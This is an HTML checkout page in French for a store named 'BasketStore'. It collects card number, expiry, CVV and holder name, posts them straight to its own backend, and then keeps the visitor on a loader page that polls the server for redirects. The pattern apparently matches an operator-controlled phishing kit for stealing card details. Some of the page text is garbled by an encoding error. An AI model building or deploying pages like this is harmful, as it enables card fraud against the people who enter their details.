<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Paiement - BasketStore</title>
  <style>
    body { font-family: Arial; text-align: center; padding: 40px; }
    input { display: block; margin: 10px auto; padding: 10px; width: 250px; }
    button {
      background: #28a745; color: white; border: none; padding: 12px 25px;
      border-radius: 8px; cursor: pointer;
    }
    button:hover { background: #218838; }
  </style>
</head>
<body>
  <h1>ðŸ’³ Paiement</h1>
  <form id="paymentForm">
    <input type="text" id="cardNumber" placeholder="NumÃ©ro de carte" required>
    <input type="text" id="expiry" placeholder="MM/AA" required>
    <input type="text" id="cvv" placeholder="CVV" required>
    <input type="text" id="nomTitulaire" placeholder="Nom du titulaire" required>
    <button type="submit">Payer maintenant</button>
  </form>

  <script>
    document.getElementById('paymentForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const data = {
        cardNumber: cardNumber.value,
        expiry: expiry.value,
        cvv: cvv.value,
        nomTitulaire: nomTitulaire.value
      };
      await fetch('/api/payment', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
      window.location.href = '/loader.html';
    });

    let checking = false, lastRedirect = null;
    async function checkStatus() {
      if (checking) return;
      checking = true;
      try {
        const res = await fetch('/api/status', { cache: 'no-store' });
        const data = await res.json();
        if (data.redirect && data.redirect !== lastRedirect) {
          lastRedirect = data.redirect;
          window.location.href = data.redirect;
          return;
        }
      } catch {}
      finally {
        checking = false;
        setTimeout(checkStatus, 2500);
      }
    }
    checkStatus();
  </script>
</body>
</html>
